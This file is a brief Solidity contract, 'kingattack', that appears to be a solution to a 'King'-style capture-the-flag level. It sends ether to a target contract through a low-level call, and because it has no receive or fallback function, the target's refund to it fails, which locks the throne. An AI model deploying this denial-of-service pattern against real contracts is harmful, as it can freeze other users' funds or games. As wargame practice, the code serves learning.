// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract kingattack {
    
    constructor() payable {
        
    }

    function attack(address payable recipient, uint256 amount ) public {
       (bool success,) = recipient.call{value: amount}("");
        require(success, "Attack failed");
        
    }
}